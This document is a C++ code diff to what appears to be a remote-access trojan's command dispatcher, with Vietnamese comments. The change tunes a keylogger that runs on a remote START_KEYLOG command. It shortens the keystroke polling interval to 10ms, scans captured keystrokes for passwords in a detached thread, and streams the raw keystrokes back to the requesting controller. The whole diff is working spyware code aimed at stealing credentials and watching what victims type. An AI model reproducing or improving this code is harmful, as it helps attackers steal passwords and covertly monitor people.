@@ -416,7 +416,7 @@ void CommandDispatcher::registerHandlers() {
         cb(Message(Protocol::TYPE::START_KEYLOG, {{"status", "ok"}, {"msg", "Keylogger started (Streaming mode)"}}, "", msg.from));
 
         std::thread([msg, cb]() {
-            int intervalMs = 500; 
+            int intervalMs = 10; 
             
             try {
                 std::string args = msg.getDataString();
@@ -427,27 +427,50 @@ void CommandDispatcher::registerHandlers() {
                     }
                 }
             } catch(...) {}
-            if (intervalMs < 100) intervalMs = 100;
+            if (intervalMs < 5) intervalMs = 5;
 
+            // Pre-allocate string để tránh reallocation
+            std::string stringForAnalyzer;
+            stringForAnalyzer.reserve(2048);
+            
             while (g_isKeylogging) {
-                std::this_thread::sleep_for(std::chrono::milliseconds(intervalMs));
+                auto startTime = std::chrono::steady_clock::now();
                 
                 vector<string> currentKeysVector = Keylogger::getDataAndClear();
                 if (!currentKeysVector.empty()) {
-                    std::string stringForAnalyzer = "";
-
+                    // Tối ưu string concatenation - tính tổng size trước
+                    stringForAnalyzer.clear();
+                    size_t totalSize = 0;
+                    for (const auto& key : currentKeysVector) {
+                        totalSize += key.size();
+                    }
+                    stringForAnalyzer.reserve(totalSize);
+                    
+                    // Concatenate
                     for (const auto& key : currentKeysVector) {
                         stringForAnalyzer += key;
                     }
 
-                    PasswordDetector::analyzeKeylogBuffer(stringForAnalyzer);
+                    // Chạy password detection async để không block việc gửi
+                    std::thread([stringForAnalyzer]() {
+                        PasswordDetector::analyzeKeylogBuffer(stringForAnalyzer);
+                    }).detach();
                     
+                    // Gửi ngay không đợi password detection
                     cb(Message(Protocol::TYPE::STREAM_DATA, 
                         {
                             {"status", "ok"},
                             {"mime", "keylog"},
                             {"data", currentKeysVector}
                         }, "", msg.from));
+                }
+                
+                // Tính toán sleep time chính xác để đảm bảo interval
+                auto elapsed = std::chrono::steady_clock::now() - startTime;
+                auto sleepTime = std::chrono::milliseconds(intervalMs) - 
+                                 std::chrono::duration_cast<std::chrono::milliseconds>(elapsed);
+                if (sleepTime.count() > 0) {
+                    std::this_thread::sleep_for(sleepTime);
                 }
             }
         }).detach();
